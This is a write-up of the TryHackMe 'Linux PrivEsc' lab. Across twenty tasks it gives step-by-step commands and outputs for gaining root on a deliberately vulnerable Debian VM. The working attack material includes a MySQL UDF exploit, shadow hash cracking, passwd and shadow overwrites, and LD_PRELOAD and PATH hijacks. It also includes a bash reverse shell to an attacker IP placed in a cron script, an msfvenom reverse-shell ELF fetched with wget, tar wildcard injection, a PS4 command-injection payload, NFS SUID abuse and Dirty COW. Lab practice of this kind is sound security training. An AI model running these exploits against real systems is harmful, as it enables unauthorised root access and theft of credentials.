# Linux PrivEsc TryHackMe
# Task 1 : Deploy the Vulnerable Debian VM 
connect to ssh using 
```
ssh user@IP 
```
or use this in case of any errors
```
ssh user@IP -oHostKeyAlgorithms=+ssh-rsa
```
then use `id` command to get the result

# Task 2 : Service Exploits

Change into the /home/user/tools/mysql-udf directory:
```
cd /home/user/tools/mysql-udf
```
Compile the raptor_udf2.c exploit code using the following commands:
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Connect to the MySQL service as the root user with a blank password:
```
mysql -u root
```
Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!
```
rm /tmp/rootbash
exit
```

# Task 3 : Weak File Permissions - Readable /etc/shadow

Checking permission on */etc/shadow*
```
ls -l /etc/shadow
```
then read the file using `cat /etc/shadow`\
*root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::*

Identify the hash using hashcat 

```
hashcat '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0'
```
output
```
1800 | sha512crypt $6$, SHA512 (Unix) | Operating System
```

now store the hash and crack it
```
hashcat -a 0 -m 1800 hash.txt /path/rockyou.txt
```
if previously used then it won't show just use 
```
hashcat -a 0 -m 1800 hash.txt ../rockyou.txt --show
```
ouptut
```
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
```

# Task 4 : Weak File Permissions - Writable /etc/shadow

Checking permission on */etc/shadow*
```
ls -l /etc/shadow
```
it's writable so Generate a new password hash with a password of your choice:
```
mkpasswd -m sha-512 newpasswordhere
```
output
```
$6$Cd1QRSVOD8km$KAi07b699vqKBIZ8df6OEM.E2gERFDkuQb.8wuyT.BIGal6yV0yTyGCupw27wj4CCJO98woiVjJrJyI45glrH/
```
now edit the *e/tc/shadow*\
replace the \
`root:<put_your_generated_hash_here:17298:0:99999:7:::`\
save and login using `su root`

You're Done root 😎

# Task 5 : Weak File Permissions - Writable /etc/passwd

Note that the /etc/passwd file is world-writable:
```
ls -l /etc/passwd
```
Generate a new password hash with a password of your choice:
```
openssl passwd password
```
Now edit the /etc/passwd file and replace x with the new genrated password\
`root:x:0:0:root:/root:/bin/bash` to `root:IMyXn8qsuEBEo:0:0:root:/root:/bin/bash`

Login to root `su root` get the id using `id` command and You're done 😎

# Task 6 : Sudo - Shell Escape Sequences

List the programs which sudo allows your user to run:
```
sudo -l
```
output
```
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

```
search [GTFObins](https://gtfobins.github.io/) for sudo escape sequence 
here apache doesn't have a escape sequence but we can use this to read a file that we don't have permission to :
```
cat /etc/shadow-
cat: /etc/shadow-: Permission denied
```
but with apache2 
```
sudo apache2 -f /etc/shadow-
Syntax error on line 1 of /etc/shadow-:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```
And You're done 😄

# Task 7 : Sudo - Environment Variables

Check which environment variables are inherited (look for the env_keep options):
```
sudo -l
```
LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
```
sudo LD_PRELOAD=/tmp/preload.so awk
```

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:
```
ldd /usr/sbin/apache2
```
Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
```
sudo LD_LIBRARY_PATH=/tmp apache2
```

# Task 8 : Cron Jobs - File Permissions

View the contents of the system-wide crontab:
```
cat /etc/crontab
```
There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:
```
locate overwrite.s
```
ouptut
```
/usr/local/bin/overwrite.sh
```

Note that the file is world-writable:
```
ls -l /usr/local/bin/overwrite.sh
```

overwrite the file with this 
```
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

start your listner 
```
nc -nvlp 4444
```
you'll get the shell in a minute and you're done 😸

# Task 9 : Cron Jobs - PATH Environment Variable

View the contents of the system-wide crontab:
```
cat /etc/crontab
```
`Note that the PATH variable starts with /home/user which is our user's home directory.`

Create a file called overwrite.sh in your home directory with the following contents:
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:
```
chmod +x /home/user/overwrite.sh
```
Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
now remove the temp file
```
rm /tmp/rootbash
exit
```

# Task 10 : Cron Jobs - Wildcards

View the contents of the other cron job script:
```
cat /usr/local/bin/compress.sh
```
Note that the tar command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```
Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
I used python webserver\
on attacker machine : `python3 -m http.server 80` and on the VM `wget <attackerip>/shell.elf`\
then
```
chmod +x /home/user/shell.elf
```
Create these two files in /home/user:
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
```
nc -nvlp 4444
```
Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
```
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

# Task 11 : SUID / SGID Executables - Known Exploits

Find all the SUID/SGID executables on the Debian VM:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
result 
```
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwsr-sr-x 1 root root 926536 Sep 25 10:30 /tmp/rootbash
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```
the *exim-4.84-3* looks interesting so search in [exploitdb](https://www.exploit-db.com)\
search for exim-4-84.3 and download the exploit\
make it executeable using `chmod +x cve-2016-1531.sh`\
Run the exploit script to gain a root shell:
```
./cve-2016-1531.sh
```
There you go you got the shell 😺

# Task 12 : SUID / SGID Executables - Shared Object Injection

Find all the SUID/SGID executables on the Debian VM:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:
```
/usr/local/bin/suid-so
```
output:
```
Calculating something, please wait...
[=====================================================================>] 99 %
Done.

```
Run strace on the file and search the output for open/access calls and for "no such file" errors:
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
ouptut:
```
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

Create the .config directory for the libcalc.so file:
```
mkdir /home/user/.config
```
Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:
```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
```
/usr/local/bin/suid-so
```
output:
```
Calculating something, please wait...
bash-4.1# id
uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1#
```
That's it 😄

# Task 13 : SUID / SGID Executables - Environment Variables


Find all the SUID/SGID executables on the Debian VM:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
ouput will be like :
```
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```
The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:
```
/usr/local/bin/suid-env
```
output:
```
Starting web server: apache2httpd (pid 1759) already running
.
```
Run strings on the file to look for strings of printable characters:
```
strings /usr/local/bin/suid-env
```
output:
```
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```
One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.\
Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:
```
gcc -o service /home/user/tools/suid/service.c
```
Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
```
PATH=.:$PATH /usr/local/bin/suid-env
```
output:
```
user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
root@debian:~#
```
Got root shell 😅

# Task 14 : SUID / SGID Executables - Abusing Shell Features (#1)
The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:
```
strings /usr/local/bin/suid-env2
```
output:
```
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```
In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:
```
/bin/bash --version
```
output:
```
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```
Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
Run the suid-env2 executable to gain a root shell:
```
/usr/local/bin/suid-env2
```
output:
```
user@debian:~$ function /usr/sbin/service { /bin/bash -p; }
user@debian:~$ export -f /usr/sbin/service 
user@debian:~$ /usr/local/bin/suid-env2
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:~# 
```

# Task 15 : SUID / SGID Executables - Abusing Shell Features (#2)
### Note: This will not work on Bash versions 4.4 and above.
When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
output:
```
/usr/sbin/service apache2 start
basename /usr/sbin/service
VERSION='service ver. 0.91-ubuntu1'
basename /usr/sbin/service
USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
SERVICE=
ACTION=
SERVICEDIR=/etc/init.d
OPTIONS=
'[' 2 -eq 0 ']'
cd /
'[' 2 -gt 0 ']'
case "${1}" in
'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
'[' 2 -eq 2 -a start = --full-restart ']'
'[' -z '' ']'
SERVICE=apache2
shift
'[' 1 -gt 0 ']'
case "${1}" in
'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
'[' 1 -eq 2 -a '' = --full-restart ']'
'[' -z apache2 ']'
'[' -z '' ']'
ACTION=start
shift
'[' 0 -gt 0 ']'
'[' -r /etc/init/apache2.conf ']'
'[' -x /etc/init.d/apache2 ']'
exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
Starting web server: apache2httpd (pid 1759) already running
.
```
Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
```
rm /tmp/rootbash
exit
```

# Task 16 : Passwords & Keys - History Files
If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:
```
cat ~/.*history | less
```
output:
```
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
ifconfig
netstat -antp
nano myvpn.ovpn 
bla bla bla...
```
Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!

Switch to the root user, using the password:
```
su root
```
YAY 😄

# Task 17 : Passwords & Keys - Config Files
Config files often contain passwords in plaintext or other reversible formats.

List the contents of the user's home directory:
```
ls /home/user
```
output:
```
myvpn.ovpn  service  tools
```
Note the presence of a myvpn.ovpn config file. View the contents of the file:
```
cat /home/user/myvpn.ovpn
```
output:
```
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

```
The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:
```
user@debian:~$ cat /etc/openvpn/auth.txt 
root
password123
```
```
su root
```

Done 😃

# Task 18 : Passwords & Keys - SSH Keys
Sometimes users make backups of important files but fail to secure them with the correct permissions.

Look for hidden files & directories in the system root:
```
ls -la /
```
output:
```
total 96
drwxr-xr-x 22 root root  4096 Aug 25  2019 .
drwxr-xr-x 22 root root  4096 Aug 25  2019 ..
drwxr-xr-x  2 root root  4096 Aug 25  2019 bin
drwxr-xr-x  3 root root  4096 May 12  2017 boot
drwxr-xr-x 12 root root  2820 Sep 26 02:32 dev
drwxr-xr-x 67 root root  4096 Sep 26 02:58 etc
drwxr-xr-x  3 root root  4096 May 15  2017 home
lrwxrwxrwx  1 root root    30 May 12  2017 initrd.img -> boot/initrd.img-2.6.32-5-amd64
drwxr-xr-x 12 root root 12288 May 14  2017 lib
lrwxrwxrwx  1 root root     4 May 12  2017 lib64 -> /lib
drwx------  2 root root 16384 May 12  2017 lost+found
drwxr-xr-x  3 root root  4096 May 12  2017 media
drwxr-xr-x  2 root root  4096 Jun 11  2014 mnt
drwxr-xr-x  2 root root  4096 May 12  2017 opt
dr-xr-xr-x 96 root root     0 Sep 26 02:30 proc
drwx------  5 root root  4096 May 15  2020 root
drwxr-xr-x  2 root root  4096 May 13  2017 sbin
drwxr-xr-x  2 root root  4096 Jul 21  2010 selinux
drwxr-xr-x  2 root root  4096 May 12  2017 srv
drwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh
drwxr-xr-x 13 root root     0 Sep 26 02:30 sys
drwxrwxrwt  2 root root  4096 Sep 26 03:05 tmp
drwxr-xr-x 11 root root  4096 May 13  2017 usr
drwxr-xr-x 14 root root  4096 May 13  2017 var
lrwxrwxrwx  1 root root    27 May 12  2017 vmlinuz -> boot/vmlinuz-2.6.32-5-amd64
```
Note that there appears to be a hidden directory called .ssh. View the contents of the directory:
```
ls -l /.ssh
```
output:
```
user@debian:~$ ls /.ssh/
root_key
```
copy the key and give it permission
```
chmod 600 root_key
```
Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):
```
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.201.12
```
output (use from attacker machine):
```
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2
root@debian:~# 

```
# Task 19 : NFS
Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:
```
cat /etc/exports
```
output:
```
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)
```

Note that the /tmp share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:
```
sudo su
```
Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
```
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```
output:
```
Created symlink /run/systemd/system/remote-fs.target.wants/rpc-statd.service → /usr/lib/systemd/system/rpc-statd.service.
```
Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
output:
```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of elf file: 132 bytes
Error: No such file or directory @ rb_sysopen - /tmp/nfs/shell.elf
```
Still using Kali's root user, make the file executable and set the SUID permission:
```
chmod +xs /tmp/nfs/shell.elf
```
Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
```
/tmp/shell.elf
```
output:
```
user@debian:/tmp$ ./shell.elf 
bash-4.1#
```
Done 😄

# Task 20 : Kernel Exploits
Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

Run the Linux Exploit Suggester 2 [les2](https://github.com/jondonas/linux-exploit-suggester-2) tool to identify potential kernel exploits on the current system:
```
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```
output:
```
 #############################                                                                                                                                                               
    Linux Exploit Suggester 2                                                                                                                                                                 
  #############################                                                                                                                                                               
                                                                                                                                                                                              
  Local Kernel: 2.6.32                                                                                                                                                                        
  Searching 72 exploits...                                                                                                                                                                    
                                                                                                                                                                                              
  Possible Exploits                                                                                                                                                                           
  [1] american-sign-language
      CVE-2010-4347
      Source: http://www.securityfocus.com/bid/45408
  [2] can_bcm
      CVE-2010-2959
      Source: http://www.exploit-db.com/exploits/14814
  [3] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [4] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [5] half_nelson1
      Alt: econet       CVE-2010-3848
      Source: http://www.exploit-db.com/exploits/17787
  [6] half_nelson2
      Alt: econet       CVE-2010-3850
      Source: http://www.exploit-db.com/exploits/17787
  [7] half_nelson3
      Alt: econet       CVE-2010-4073
      Source: http://www.exploit-db.com/exploits/17787
  [8] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [9] pktcdvd
      CVE-2010-3437
      Source: http://www.exploit-db.com/exploits/15150
  [10] ptrace_kmod2
      Alt: ia32syscall,robert_you_suck       CVE-2010-3301
      Source: http://www.exploit-db.com/exploits/15023
  [11] rawmodePTY
      CVE-2014-0196
      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
  [12] rds
      CVE-2010-3904
      Source: http://www.exploit-db.com/exploits/15285
  [13] reiserfs
      CVE-2010-1146
      Source: http://www.exploit-db.com/exploits/12130
  [14] video4linux
      CVE-2010-3081
      Source: http://www.exploit-db.com/exploits/15024
```
The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

Compile the code and run it (note that it may take several minutes to complete):
```
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```
output:
```
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 33231000

ptrace 0
```
Once the exploit completes, run /usr/bin/passwd to gain a root shell:
```
/usr/bin/passwd
```
output:
```
user@debian:~$ /usr/bin/passwd 
root@debian:/home/user# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```
Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!
```
mv /tmp/bak /usr/bin/passwd
exit
```

Additional Scripts for Privilege Escalations are 
- [LinPeas](https://github.com/peass-ng/PEASS-ng)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
